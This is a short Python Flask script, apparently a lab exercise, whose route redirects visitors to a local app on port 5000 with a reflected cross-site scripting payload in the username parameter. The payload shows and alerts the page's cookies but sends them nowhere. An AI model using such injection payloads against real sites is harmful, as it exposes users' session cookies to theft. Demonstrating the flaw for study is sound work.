from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def attack():
    #Потенційно шкідливий JavaScript-код
    malicious_input = (
        "<script>"
        "document.body.style.backgroundColor = 'red';"
        "const h1 = document.createElement('h1');"
        "h1.textContent = document.cookie;"
        "document.body.appendChild(h1);"
        "alert(document.cookie)"
        "</script>"
    )
    return redirect(f"http://localhost:5000/?username={malicious_input}")

if __name__ == '__main__':
    app.run(port=5002)